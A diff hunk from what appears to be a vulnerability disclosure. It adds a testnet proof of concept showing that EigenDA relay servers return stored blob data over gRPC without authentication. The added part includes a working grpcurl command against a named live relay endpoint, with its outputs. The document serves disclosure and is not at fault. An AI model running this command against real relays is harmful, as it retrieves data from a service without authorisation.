@@ -483,6 +483,21 @@ the positive result was real data retrieval, not a default response.
 Sepolia testnet: Same attack on relay-0-testnet-sepolia.eigenda.xyz
 returned 21,865 bytes — also confirmed.
 
+END-TO-END PoC (2026-05-12, Sepolia testnet):
+  Wallet: 0x6C81863010c6f09af0E0032f495124948b63dd74
+  1. Submitted 3 blobs via eigenda-proxy (signing key: DABEAT testnet key)
+  2. Confirmed dispersal via DataAPI (status: Complete, 128B each)
+  3. Retrieved ALL 3 blobs from relay WITHOUT any authentication:
+     $ grpcurl -d '{"blob_key":"<base64>"}' \
+         relay-0-testnet-sepolia.eigenda.xyz:443 relay.Relay/GetBlob
+     → blob_key=e3f6ceb2... → 128 bytes (no auth)
+     → blob_key=9c26fd2a... → 128 bytes (no auth)
+     → blob_key=cb408cac... → 128 bytes (no auth)
+  4. Negative test: invalid key returns "Code: NotFound"
+
+Conclusion: Any party knowing a blob_key can retrieve the full blob data
+from the relay with zero credentials, on both mainnet and testnet.
+
 Detection: Rate limiter logs only (global, no per-client attribution)
 ```
 
